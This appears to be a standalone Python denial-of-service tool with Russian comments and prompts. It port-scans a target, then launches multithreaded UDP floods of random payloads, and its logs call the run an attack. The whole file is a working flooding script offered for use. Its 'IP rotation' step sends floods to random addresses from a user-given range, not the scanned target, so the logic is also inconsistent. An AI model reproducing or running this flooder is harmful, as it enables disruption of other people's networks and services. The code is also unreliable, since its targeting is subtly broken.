import random
import socket
import threading
import time
import sys
from scapy.all import *
import logging
import ipaddress

# Настройка логгирования
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def generate_payload(size):
    return ''.join([chr(random.randint(0, 255)) for _ in range(size)])

def flood(target_ip, target_port, duration, mtu=1500):
    start_time = time.time()
    packets_sent = 0
    packets_failed = 0
    
    while time.time() - start_time < duration:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            payload = generate_payload(random.randint(512, mtu)).encode('utf-8')
            s.sendto(payload, (target_ip, target_port))
            packets_sent += 1
            s.close()
            logging.info(f"Пакет отправлен на {target_ip}:{target_port}")
        except socket.error as e:
            packets_failed += 1
            logging.warning(f"Ошибка при отправке пакета: {e}")
        time.sleep(0.01)  # Небольшая задержка, чтобы избежать полной загрузки CPU

    logging.info(f"Атака завершена. Отправлено пакетов: {packets_sent}, не отправлено: {packets_failed}")

def port_scan(ip_address):
    """Сканирует открытые порты на указанном IP."""
    open_ports = []
    for port in range(1, 1025):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = sock.connect_ex((ip_address, port))
        if result == 0:
            open_ports.append(port)
        sock.close()
    return open_ports

def ip_rotation(ip_range, num_ips):
    """Возвращает список IP-адресов для ротации."""
    network = ipaddress.ip_network(ip_range)
    return list(network.hosts())[:num_ips]

def main():
    if len(sys.argv) < 2:
        print("Usage: python script.py <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(input("Введите целевой порт (или нажмите Enter для сканирования): ") or 0)
    
    if target_port == 0:
        logging.info("Сканирование открытых портов...")
        open_ports = port_scan(target_ip)
        if open_ports:
            target_port = open_ports[0]
            logging.info(f"Обнаружен открытый порт: {target_port}")
        else:
            logging.error("Ни один порт не открыт.")
            sys.exit(1)

    duration = int(input("Введите длительность атаки в секундах: "))
    num_threads = int(input("Введите количество потоков: "))
    mtu = int(input("Введите MTU (1500 по умолчанию): ") or 1500)
    
    # Ротация IP
    ip_range = input("Введите диапазон IP для ротации (например, 192.168.1.0/24): ")
    num_ips = int(input("Введите количество IP-адресов для ротации: "))
    rotated_ips = ip_rotation(ip_range, num_ips)

    threads = []
    for _ in range(num_threads):
        ip = random.choice(rotated_ips)
        thread = threading.Thread(target=flood, args=(str(ip), target_port, duration, mtu))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
